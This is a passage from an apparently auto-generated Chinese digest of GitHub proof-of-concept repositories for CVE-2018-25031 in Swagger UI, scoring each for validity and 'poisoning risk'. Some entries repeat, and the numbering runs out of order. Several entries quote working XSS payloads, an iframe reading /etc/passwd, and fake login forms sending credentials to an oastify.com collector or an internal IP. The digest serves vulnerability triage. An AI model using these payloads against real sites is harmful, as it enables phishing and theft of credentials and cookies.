**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗

**影响版本:** <= 4.1.2

**利用条件:** 需要目标用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-25031 漏洞允许远程攻击者进行欺骗攻击。通过诱使用户打开特制的 URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞存在于Swagger UI 4.1.2及更早版本中。提供的POC包含一个json文件和一个yaml文件, json文件中定义了yaml文件的url, yaml文件定义了一个openapi接口。攻击者诱使用户访问包含指向恶意json文件的链接的Swagger UI页面，该JSON文件随后加载并显示恶意的 OpenAPI 定义。 投毒风险较低，主要在于如果利用代码仓库被黑客入侵，替换了 `poc.yaml` 文件内容，可能会将用户引导到恶意网站或执行恶意操作，所以风险存在，但概率较低。

**有效性：** 根据漏洞描述和搜索结果，提供的POC代码有效，可以用于显示远程 OpenAPI 定义，从而达到欺骗的目的。

**投毒风险：** 投毒风险评估为 5%。虽然当前提供的 POC 代码本身只是用于演示欺骗攻击，并不包含直接的恶意代码，但是如果攻击者能够控制 `raw.githubusercontent.com` 上的 `poc.yaml` 文件，他们就可以修改显示的 OpenAPI 定义，例如将其指向恶意网站，或包含 XSS 漏洞等。因此，存在一定的投毒风险，但主要取决于对托管 OpenAPI 定义文件的服务器的控制。 此外此POC需要依赖githubusercontent, 如果此域名被污染也可能会出现安全问题。

**利用方式：**

1.  攻击者创建一个恶意的 OpenAPI 定义文件（例如 `poc.yaml`），该文件可能指向恶意网站或包含其他恶意内容。
2.  攻击者创建一个 JSON 文件（例如 `poc.json`），该文件包含指向恶意 OpenAPI 定义文件的 URL。
3.  攻击者诱使用户访问包含指向恶意 JSON 文件的链接的 Swagger UI 页面，例如通过电子邮件、社交媒体等方式。
4.  Swagger UI 加载恶意 JSON 文件，并显示恶意的 OpenAPI 定义。
5.  用户可能会被欺骗，误以为恶意 OpenAPI 定义来自受信任的来源，从而执行恶意操作。

**项目地址:** [rasinfosec/CVE-2018-25031](https://github.com/rasinfosec/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #18

**来源**: [CVE-2018-25031-wrkk112_CVE-2018-25031.md](../2018/CVE-2018-25031-wrkk112_CVE-2018-25031.md)

## CVE-2018-25031 - Swagger UI Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 是 Swagger UI 中的一个欺骗漏洞。攻击者可以通过诱导受害者打开一个特制的URL，从而显示远程的 OpenAPI 定义。提供的POC代码展示了利用此漏洞的步骤，包括使用一个包含恶意 OpenAPI 定义的JSON文件。该JSON文件指定了远程的YAML文件，其中ismsxss.yaml包含XSS payload。具体来说，ismsxss.yaml包含一段JavaScript代码（`<img onerror=alert(document.domain) src>`），这段代码会在Swagger UI中执行，从而实现跨站脚本攻击（XSS）。

**有效性：** 根据漏洞信息和POC代码，漏洞是有效的。攻击者通过诱导用户打开包含恶意链接的网页，可以执行XSS攻击。

**投毒风险：** 通过分析提供的POC代码，未发现明显的作者隐藏的投毒代码。虽然POC代码中包含XSS payload，但这是为了验证漏洞的存在，并非恶意投毒。因此，投毒风险为0%。

**利用方式：**

1.  攻击者创建一个包含指向恶意 OpenAPI 定义文件的 URL。
2.  攻击者通过社会工程学等方法诱导受害者点击该 URL。
3.  受害者的 Swagger UI 加载恶意的 OpenAPI 定义文件。
4.  恶意 OpenAPI 定义文件中的 XSS payload 在受害者的浏览器中执行，从而实现攻击目的。例如，可以窃取用户的Cookie或执行其他恶意操作。

**项目地址:** [wrkk112/CVE-2018-25031](https://github.com/wrkk112/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---



---

## POC #7

**来源**: [CVE-2018-25031-h2oa_CVE-2018-25031.md](../2018/CVE-2018-25031-h2oa_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和欺骗攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统运行存在漏洞的Swagger UI实例，且受害者点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI中的一个漏洞，允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程OpenAPI定义。漏洞的根本原因是Swagger UI在处理URL输入时存在缺陷，允许攻击者控制Swagger UI加载的API定义来源。

**有效性：**
提供的POC代码有效。`poc.json`指定了要加载的远程OpenAPI定义文件的URL，`poc.yaml`包含了将被显示的恶意API定义。当用户访问包含该URL的Swagger UI页面时，会显示`poc.yaml`中定义的API信息，从而实现欺骗。

**投毒风险：**
该存储库存在一定的投毒风险，约为10%。虽然提供的`poc.json`和`poc.yaml`文件本身没有恶意代码，但攻击者可能通过以下方式进行投毒：

1.  **URL替换：** 攻击者可能会修改`poc.json`中的URL，指向包含恶意JavaScript代码的OpenAPI定义文件，从而在用户访问Swagger UI页面时执行恶意代码（虽然此漏洞主要描述是欺骗，但是不排除被利用做成XSS攻击）。
2.  **协作用户投毒：** 如果存储库允许协作，恶意用户可能会提交包含恶意代码的OpenAPI定义文件。

需要强调的是，目前提供的POC代码主要用于欺骗攻击，旨在展示伪造的API定义。要实现完整的攻击，还需要结合其他漏洞（如XSS）或社工手段。

**利用方式：**
1.  攻击者构造包含指向恶意`poc.json`文件的URL。
2.  攻击者诱使受害者点击该URL。可以通过邮件、社交媒体或其他方式进行诱导。
3.  受害者在其浏览器中打开包含该URL的Swagger UI页面。
4.  Swagger UI加载`poc.json`中指定的远程OpenAPI定义文件（`poc.yaml`）。
5.  Swagger UI显示`poc.yaml`中定义的API信息，受害者看到的是被篡改过的API文档。

**项目地址:** [h2oa/CVE-2018-25031](https://github.com/h2oa/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #8

**来源**: [CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md](../2018/CVE-2018-25031-h4ckt0m_CVE-2018-25031-test.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击 (Spoofing Attack)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意链接传播

**影响版本:** <= 4.1.2 (可能影响 4.1.3 及其他版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者发起欺骗攻击。通过诱使用户打开精心制作的URL，攻击者可以利用此漏洞显示远程 OpenAPI 定义。漏洞利用方式是，攻击者构造包含指向恶意 OpenAPI 定义（例如 test.json 或 test.yaml）的 URL，诱使用户在 Swagger UI 中加载该 URL。Swagger UI 会解析并显示恶意 OpenAPI 定义，从而允许攻击者欺骗用户。提供的PoC代码包含 `test.json` 和 `test.yaml` 两个文件。`test.json` 包含指向 `test.yaml` 的链接，而 `test.yaml` 包含 OpenAPI 定义，其中嵌入了恶意链接 `<a href="https://evil.com">Sitio malicioso</a>`。当 Swagger UI 显示此定义时，恶意链接将被呈现，如果用户点击，可能会被重定向到恶意网站。投毒风险较低，因为主要是通过恶意链接进行欺骗，而不是在代码中直接执行恶意操作。主要风险在于用户交互的部分，如果用户不点击恶意链接，风险相对较小。考虑到Github仓库的可信性未知以及`test.yaml`中存在 `evil.com` 的可疑域名，综合估计投毒风险为10%。

**项目地址:** [h4ckt0m/CVE-2018-25031-test](https://github.com/h4ckt0m/CVE-2018-25031-test)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #9

**来源**: [CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md](../2018/CVE-2018-25031-hev0x_CVE-2018-25031-PoC.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义欺骗

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和XSS攻击

**影响版本:** <= 4.1.2 (也可能存在于更高版本)

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义。根据搜索结果和漏洞信息，该漏洞的PoC是有效的。攻击者可以利用此漏洞，通过加载恶意的OpenAPI定义文件（例如xss.yaml）来欺骗用户，甚至可能执行跨站脚本攻击(XSS)。

**有效性：**

提供的PoC代码是有效的，因为它包含一个README.md文件、用于定义远程OpenAPI定义的JSON文件（poc.json），以及两个YAML文件（poc.yaml和xss.yaml）。其中，xss.yaml包含恶意的JavaScript代码，可以触发XSS攻击。

**投毒风险：**

代码仓库的投毒风险较低，约为10%。虽然xss.yaml文件包含潜在的XSS攻击代码，但它属于PoC的一部分，用于演示漏洞。其他文件看起来是合法的OpenAPI定义文件或配置文件，没有发现明显的恶意代码。但仍需谨慎，因为攻击者可能在OpenAPI定义中嵌入其他类型的恶意行为，例如SSRF攻击。

**利用方式：**

1.  攻击者创建一个包含恶意内容的OpenAPI定义文件(例如xss.yaml，包含`<noscript>`标签尝试注入XSS)。
2.  攻击者将此文件托管在远程服务器上。
3.  攻击者构造一个包含特定参数的URL，诱使用户打开，该URL指向受影响的Swagger UI实例，并指定加载恶意OpenAPI定义文件的URL作为参数。
4.  当用户打开该URL时，Swagger UI会加载并显示恶意OpenAPI定义文件，从而可能导致欺骗或XSS攻击。

总结来说，该漏洞的利用方式是通过欺骗用户加载恶意的OpenAPI定义文件，从而控制Swagger UI的显示内容，甚至执行恶意脚本。

**项目地址:** [hev0x/CVE-2018-25031-PoC](https://github.com/hev0x/CVE-2018-25031-PoC)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #10

**来源**: [CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md](../2018/CVE-2018-25031-johnlaurance_CVE-2018-25031-test2.md)

## CVE-2018-25031-Swagger UI Spoofing/SSRF/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或恶意代码执行

**影响版本:** <= 4.1.2 (可能更高版本也受影响)

**利用条件:** 需要目标系统使用存在漏洞版本的Swagger UI，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 允许远程攻击者通过诱使用户打开特制的URL来发起欺骗攻击，显示远程 OpenAPI 定义。漏洞利用方式：

1.  **欺骗攻击 (Spoofing):** 攻击者可以托管一个恶意的 OpenAPI 定义（例如 YAML 或 JSON 文件）。
2.  **诱导用户：** 攻击者构建一个包含指向恶意 OpenAPI 定义的 URL。然后，攻击者诱使用户点击此 URL。这可以通过社会工程学或其他技术实现。
3.  **Swagger UI 显示恶意定义：** 当用户访问包含恶意定义的 URL 时，Swagger UI 将加载并显示该恶意定义。
4.  **XSS/信息窃取:** 恶意的 OpenAPI 定义可以包含恶意HTML/JavaScript代码，例如，在`description`字段中插入`<script>`标签或者`<form>`标签，在用户浏览器中执行，从而窃取用户信息（例如cookie）或执行其他恶意操作，比如进行钓鱼。

从提供的漏洞利用代码来看， `poc3.yaml`和`try.yaml` 文件中， `description` 字段包含了`<form>`标签，模拟了一个登录表单，目的是诱骗用户输入用户名和密码，并将这些信息发送到攻击者控制的服务器 `ttqbbaf0yx45z9zqgpmfcvjyhpngbcz1.oastify.com` 。另外，还包含一个`onerror`事件的图像标签，当图片加载失败时，会执行JavaScript代码`alert(document.cookie)`，从而可能泄露用户的cookie信息。 这些代码证明了利用此漏洞执行XSS攻击，窃取用户信息的可能性。

**投毒风险分析:**

虽然主要的攻击向量是利用Swagger UI的缺陷来展示恶意的OpenAPI定义，但代码仓库中存在一定的投毒风险。这种风险主要体现在：

*   攻击者可能会在 YAML/JSON 文件中加入一些隐蔽的恶意代码，例如混淆的 JavaScript 或利用其他漏洞的代码片段。然而，从提供的代码中看，主要利用方式较为直接，没有明显的隐藏后门。
*   仓库本身可能被篡改，虽然代码相对简单，但仓库维护者的身份以及代码的来源都存在一定的不确定性，不能完全排除代码仓库所有者添加恶意代码的可能性。

因此，综合考虑以上因素，判断存在10%的投毒风险。

**项目地址:** [johnlaurance/CVE-2018-25031-test2](https://github.com/johnlaurance/CVE-2018-25031-test2)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #11

**来源**: [CVE-2018-25031-kriso4os_CVE-2018-25031.md](../2018/CVE-2018-25031-kriso4os_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示欺骗/XSS

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本攻击 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI中，攻击者可以通过诱使用户打开一个特制的URL，从而显示远程OpenAPI定义。该URL可以指向攻击者控制的服务器，显示恶意的API文档或利用XSS漏洞。根据提供的POC代码，`XSS.yaml`文件中包含一个XSS payload: `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>`。当Swagger UI渲染此文件时，会触发`alert(document.domain)`，表明XSS攻击成功。`poc.yaml` 仅包含基本的openapi定义，并未包含任何恶意代码。

**有效性：** 提供的POC代码有效，可以利用该漏洞。

**投毒风险：** 经过分析，提供的POC代码主要用于演示漏洞，未发现作者隐藏的恶意代码。因此，投毒风险为0%。代码中引用的远程yaml文件地址指向githubusercontent.com，如果该代码库被劫持或者作者主动添加恶意代码，则可能产生投毒。

**利用方式：** 
1.  攻击者构建一个包含恶意OpenAPI定义的YAML或JSON文件，其中包含XSS payload，例如`XSS.yaml`。
2.  攻击者创建一个恶意URL，该URL指向受影响的Swagger UI实例，并包含参数，指定要加载的恶意OpenAPI定义文件的URL。
3.  攻击者诱使用户点击该恶意URL。
4.  当用户点击恶意URL后，Swagger UI会加载并渲染攻击者提供的OpenAPI定义文件。
5.  如果OpenAPI定义文件中包含XSS payload，则会在用户的浏览器中执行恶意代码，从而导致跨站脚本攻击。
6.  攻击者可以利用该漏洞窃取用户的敏感信息或执行其他恶意操作。此外，攻击者也可以利用该漏洞进行欺骗攻击，例如显示虚假的API文档，诱导用户进行错误的操作。

**项目地址:** [kriso4os/CVE-2018-25031](https://github.com/kriso4os/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #12

**来源**: [CVE-2018-25031-labeebSabbah_CVE-2018-25031.md](../2018/CVE-2018-25031-labeebSabbah_CVE-2018-25031.md)

## CVE-2018-25031-SwaggerUI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/信息泄露/SSRF

**影响应用:** SwaggerUI

**危害等级:** 中危，可能导致信息泄露和潜在的中间人攻击

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-25031 允许远程攻击者进行欺骗攻击。攻击者可以通过诱使用户打开特制的 URL 来显示远程 OpenAPI 定义。攻击者提供的 htmli.json 文件包含指向恶意 htmli.yaml 文件的 URL。htmli.yaml 文件包含一段 HTML 代码，该代码伪造一个登录表单，并将用户输入的 email 和 password 发送到 `http://10.212.234.14/`。因此利用方式是，攻击者诱骗用户点击恶意链接，swaggerUI 加载恶意的 OpenAPI 定义，在 SwaggerUI 界面上展示伪造的登录表单，当用户输入登录信息时，攻击者可以窃取用户的凭据。由于yaml文件内容明确，不包含其它恶意代码，因此投毒风险为0%。利用方式总结：

1.  **漏洞利用：** 攻击者制作包含恶意 OpenAPI 定义的 YAML 文件。
2.  **诱导用户：** 攻击者通过某种方式（例如，电子邮件、社交媒体）诱使用户点击包含恶意 YAML 文件 URL 的链接。
3.  **欺骗：** 当用户点击链接时，Swagger UI 会加载恶意 YAML 文件，并显示其中的内容。攻击者可以在 YAML 文件中嵌入恶意 HTML 或 JavaScript 代码，例如伪造登录表单，诱骗用户输入敏感信息。
4.  **信息窃取：** 如果用户在伪造的登录表单中输入了用户名和密码，这些信息将被发送到攻击者指定的服务器。

**有效性：** 提供的 POC 代码有效，可以重现欺骗攻击。

**利用方式总结：**

攻击者利用 Swagger UI 加载远程 OpenAPI 定义的特性，通过诱骗用户点击恶意链接，加载包含恶意 HTML 代码的 YAML 文件，从而实现欺骗攻击。该漏洞的利用需要用户交互，风险等级为中危。

**项目地址:** [labeebSabbah/CVE-2018-25031](https://github.com/labeebSabbah/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #13

**来源**: [CVE-2018-25031-mathis2001_CVE-2018-25031.md](../2018/CVE-2018-25031-mathis2001_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF/XSS

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意代码执行

**影响版本:** <= 4.1.2

**利用条件:** 需要目标系统使用存在漏洞的Swagger UI版本，并允许用户访问恶意构造的URL。

**POC 可用性:** 是

**投毒风险:** 60%

## 详情

CVE-2018-25031 是一个存在于 Swagger UI 4.1.2 及更早版本中的漏洞。攻击者可以诱骗受害者打开一个特制的 URL，从而利用此漏洞显示远程 OpenAPI 定义，造成欺骗攻击。

**有效性：**
提供的 POC 代码有效。通过 `configUrl` 或 `url` 参数，Swagger UI 可以加载远程的 OpenAPI 定义文件（JSON 或 YAML）。

**投毒风险：**
该仓库存在一定的投毒风险，风险为60%。原因如下：

*   **远程加载：** POC 利用了 Swagger UI 加载远程定义文件的功能。攻击者可以控制远程文件的内容。
*   **恶意内容：** `f.yaml` 包含大量的 XSS payload，旨在利用 Swagger UI 中的漏洞执行恶意 JavaScript 代码。例如，`<img src=x oNlY=1 oNerror=alert('xxs')//`  等。
*   **钓鱼攻击：**  `f.yaml` 中包含伪造的登录表单，诱导用户提交敏感信息到攻击者控制的服务器。
*   **SSRF风险：** `f.yaml`中包含`<iframe src=file:///etc/passwd></iframe>`，尝试读取服务器本地文件。
*   **不确定性:** 虽然漏洞利用代码的作者提供了一些payload，但这些payload本身具有攻击性。恶意使用这些Payload,可能会被作者追踪到恶意行为。但作者也可能为了混淆视听，将一些恶意的代码进行隐藏。

**利用方式：**

1.  **发现目标：** 寻找使用了存在漏洞的 Swagger UI 版本的应用。
2.  **构造恶意 URL：**  构造包含 `configUrl` 或 `url` 参数的 URL，指向攻击者控制的 JSON 或 YAML 文件。
3.  **诱骗受害者：**  通过钓鱼或其他方式诱骗受害者点击该 URL。
4.  **执行攻击：**  当受害者访问该 URL 时，Swagger UI 会加载攻击者提供的恶意定义文件，从而执行 XSS 代码或进行其他攻击（例如，窃取 cookie、重定向用户等）。

**总结：**
该漏洞的利用依赖于社会工程学，需要诱骗用户点击恶意链接。攻击者可以利用该漏洞进行钓鱼、XSS 攻击，甚至可能进行 SSRF 攻击。同时，提供的 POC 代码包含多种攻击 Payload，存在较高的投毒风险。

**项目地址:** [mathis2001/CVE-2018-25031](https://github.com/mathis2001/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #14

**来源**: [CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md](../2018/CVE-2018-25031-natpakun_SSRF-CVE-2018-25031-.md)

## CVE-2018-25031 - Swagger UI SSRF/Spoofing

**漏洞编号:** CVE-2018-25031

**漏洞类型:** SSRF/欺骗攻击

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致敏感信息泄露或重定向到恶意API定义

**影响版本:** <= 4.1.2

**利用条件:** 需要用户点击恶意构造的URL

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031是Swagger UI 4.1.2及更早版本中的一个漏洞，允许远程攻击者进行欺骗攻击。攻击者通过诱使用户打开一个特制的URL，可以利用此漏洞显示远程OpenAPI定义，从而欺骗用户。从搜索结果和漏洞描述来看，攻击依赖于用户交互，需要诱导用户点击恶意链接。漏洞利用代码提供了一个简单的`exploit.yaml`文件，该文件定义了一个Swagger API规范，包含标题和描述，可能用于展示SSRF漏洞。如果这个YAML文件托管在攻击者控制的服务器上，并通过恶意链接传递给Swagger UI，则Swagger UI会加载该文件，从而实现欺骗攻击。**有效性：** 提供的POC代码本身并不能直接实现攻击，需要结合构造的URL和受害者点击才能生效，因此属于间接PoC。**投毒风险：** 分析POC代码，`exploit.yaml` 非常简单，仅仅包含swagger版本，info信息。作者投毒可能性较低，但不能完全排除，例如通过引用远程资源或包含恶意脚本，风险评估为10%。**利用方式：** 攻击者构造包含恶意swagger定义文件URL的链接，诱使用户点击。用户点击链接后，Swagger UI加载并显示恶意swagger定义，从而实现欺骗或SSRF攻击。

**项目地址:** [natpakun/SSRF-CVE-2018-25031-](https://github.com/natpakun/SSRF-CVE-2018-25031-)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #15

**来源**: [CVE-2018-25031-nigartest_CVE-2018-25031.md](../2018/CVE-2018-25031-nigartest_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-远程OpenAPI定义显示漏洞

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗/跨站脚本 (Spoofing/XSS)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致信息泄露和恶意脚本执行

**影响版本:** <= 4.1.2 (可能影响更高版本)

**利用条件:** 需要用户点击恶意链接

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-25031 存在于 Swagger UI 4.1.2 及更早版本中。攻击者可以通过诱使用户打开精心制作的 URL，来显示远程的恶意 OpenAPI 定义。根据搜索结果和漏洞库信息，该漏洞的核心在于 Swagger UI 未能充分验证和过滤用户提供的 URL，导致可以加载并渲染来自任意来源的 OpenAPI 定义文件。这使得攻击者可以欺骗用户，展示伪造的 API 文档，甚至通过在 OpenAPI 定义中插入恶意 HTML 或 JavaScript 代码，实现跨站脚本攻击（XSS）。

**有效性：** 提供的 POC 代码有效。`domxss.yaml` 文件包含用于触发 DOM XSS 的恶意代码， `<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src>"></form>` 。 `poc.json` 和 `poc.yaml` 文件用于指定要加载的恶意 OpenAPI 定义文件。

**投毒风险：** 仓库中存在少量投毒风险。`domxss.yaml` 使用了 `otlu3omsk1ath8ur17a2kldtmksbg34s.oastify.com` 作为 `basePath`，这可能用于收集受害者的 IP 地址或进行其他形式的侦察。但核心的 XSS payload 和利用方式比较直接，主要的目的是验证漏洞，投毒的可能性较小。风险比例预估为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的 OpenAPI 定义文件（例如 `domxss.yaml`）。
2.  攻击者将此文件托管在公开可访问的 URL 上（例如 GitHub Raw Content）。
3.  攻击者构造一个包含指向恶意 OpenAPI 定义文件 URL 的链接。
4.  攻击者诱使受害者点击该链接。
5.  受害者的浏览器加载 Swagger UI，并从攻击者指定的 URL 加载恶意 OpenAPI 定义文件。
6.  Swagger UI 渲染恶意 OpenAPI 定义文件，从而执行其中的恶意代码（例如 XSS payload）。

**项目地址:** [nigartest/CVE-2018-25031](https://github.com/nigartest/CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #16

**来源**: [CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md](../2018/CVE-2018-25031-rafaelcintralopes_SwaggerUI-CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-UI Misrepresentation of Critical Information

**漏洞编号:** CVE-2018-25031

**漏洞类型:** UI Misrepresentation of Critical Information (Spoofing)

**影响应用:** Swagger UI

**危害等级:** 中危，可能导致用户信任被欺骗的API定义，进而遭受钓鱼攻击或其他恶意行为。

**影响版本:** < 4.1.3

**利用条件:** 受害者需要点击攻击者构造的恶意URL。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Swagger UI 4.1.2及更早版本中。攻击者可以通过诱骗受害者打开一个特制的URL，该URL指向攻击者控制的OpenAPI定义文件，从而在Swagger UI界面上显示被篡改的信息。这可能导致用户信任恶意API定义，并泄露敏感信息或执行非预期的操作。

**有效性分析：**
根据漏洞信息和搜索引擎结果，该漏洞利用需要用户交互，攻击者通过构造恶意URL，诱导用户点击。POC代码使用Selenium模拟浏览器行为，访问目标Swagger UI页面，并加载恶意的OpenAPI定义文件。如果Swagger UI版本低于4.1.3，则可能受到攻击，界面会显示恶意定义的内容。

**投毒风险分析：**
POC代码主要功能是验证目标Swagger UI是否存在CVE-2018-25031漏洞，通过selenium模拟点击，然后检测response log中是否存在外部恶意链接，从而检测目标是否存在该漏洞。
*   `swagger-exploit.py`: 这个脚本使用Selenium自动化测试，访问目标 Swagger UI 页面，并尝试加载两个恶意的 OpenAPI 定义文件（`hacked1.json` 和 `hacked2.json`）。它会检查网络请求日志，以确定目标是否加载了这些文件。如果加载了，则表明目标存在漏洞。该脚本没有发现任何明显的投毒代码。
*   `README.md`: 这个文件提供了关于如何使用脚本的说明。它包含安装依赖项和运行脚本的说明。也没有发现恶意代码。
所以投毒风险很低。

**利用方式分析：**
1.  攻击者构造包含`configUrl`或`url`参数的恶意URL，指向攻击者控制的OpenAPI定义文件。
2.  攻击者诱骗受害者点击该恶意URL，例如通过钓鱼邮件或社交媒体。
3.  受害者的浏览器加载恶意URL，Swagger UI显示攻击者提供的OpenAPI定义文件。
4.  如果攻击者篡改了API定义文件中的信息，例如API端点、参数说明等，受害者可能会被误导，从而遭受攻击，比如提交敏感信息到错误的端点。

该漏洞是一种客户端漏洞，主要利用用户交互进行攻击，通过欺骗用户信任恶意API定义来实现攻击目标。

**项目地址:** [rafaelcintralopes/SwaggerUI-CVE-2018-25031](https://github.com/rafaelcintralopes/SwaggerUI-CVE-2018-25031)

**漏洞详情:** [CVE-2018-25031](https://nvd.nist.gov/vuln/detail/CVE-2018-25031)

---

## POC #17

**来源**: [CVE-2018-25031-rasinfosec_CVE-2018-25031.md](../2018/CVE-2018-25031-rasinfosec_CVE-2018-25031.md)

## CVE-2018-25031-Swagger UI-欺骗攻击

**漏洞编号:** CVE-2018-25031

**漏洞类型:** 欺骗攻击/SSRF

**影响应用:** Swagger UI

